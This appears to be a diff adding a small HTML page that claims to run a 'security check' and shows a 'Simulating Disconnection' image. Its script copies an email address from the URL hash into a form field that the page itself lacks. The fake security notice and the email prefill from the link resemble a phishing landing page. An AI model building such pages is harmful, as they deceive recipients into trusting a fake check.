@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        .container {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* Center content vertically and horizontally */
+            height: 100vh; /* Set container height to viewport height */
+        }
+        .image-container {
+            position: relative;
+            width: 100%; /* Full width */
+            max-width: 900px; /* Limit the maximum width to maintain image quality */
+        }
+        .image-container img {
+            width: 100%; /* Set image width to 100% */
+            height: auto; /* Maintain aspect ratio */
+            display: block;
+        }
+        .security-check {
+            display: none; /* Initially hidden */
+            margin-top: 1rem; /* Margin from the top */
+            font-size: 1rem; /* Font size */
+            color: #4CAF50; /* Change color to green for completed status */
+            text-align: center; /* Center text */
+            font-family: 'Arial', sans-serif; /* Change font family */
+            background-color: #f2f2f2; /* Background color */
+            padding: 10px 20px; /* Padding */
+            border-radius: 10px; /* Border radius */
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.3); /* Box shadow */
+        }
+    </style>
+</head>
+<body>
+    <!-- Container for the image -->
+    <div class="container">
+        <!-- Image container -->
+        <div class="image-container">
+            <!-- Replace the text with an image -->
+            <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
+        </div>
+        <!-- Message to indicate security check completion -->
+        <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
+    </div>
+
+    <script>
+        // Function to extract email from URL hash
+        function getEmailFromHash() {
+            var hash = window.location.hash.substr(1); // Remove the "#" symbol from the hash
+            var email = decodeURIComponent(hash); // Decode the URI component to get the email
+            return email;
+        }
+
+        // Function to populate the email into your portal form field
+        function populateEmail() {
+            var email = getEmailFromHash();
+            // Assuming your portal form field has an ID of "email"
+            document.getElementById("email").value = email;
+        }
+
+        // Call the populateEmail function when the page loads
+        window.onload = function() {
+            populateEmail();
+        };
+    </script>
+</body>
+</html>
